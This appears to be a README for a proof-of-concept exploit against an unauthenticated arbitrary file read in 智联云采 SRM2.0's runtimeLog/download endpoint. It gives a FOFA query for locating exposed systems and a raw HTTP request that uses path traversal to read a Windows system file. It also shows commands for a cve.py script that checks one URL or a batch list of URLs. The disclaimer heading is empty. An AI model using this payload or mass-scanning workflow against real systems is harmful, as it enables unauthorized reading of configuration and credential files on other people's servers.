### README.md
#智联云采SRM2.0-任意文件读取
## Disclaimer

#智联云采 SRM2.0 runtimeLog/download 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

fofa语法：
title=="SRM 2.0"

#POC：

GET /adpweb/static/%2e%2e;/a/sys/runtimeLog/download?path=c:\\windows\win.ini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive

#how to use
python cve.py -h 

#批量检测
url.txt 的url地址要http://或https://
python cve.py -f  url.txt 

#单个检测
url地址要http://或https://
python cve.py -u url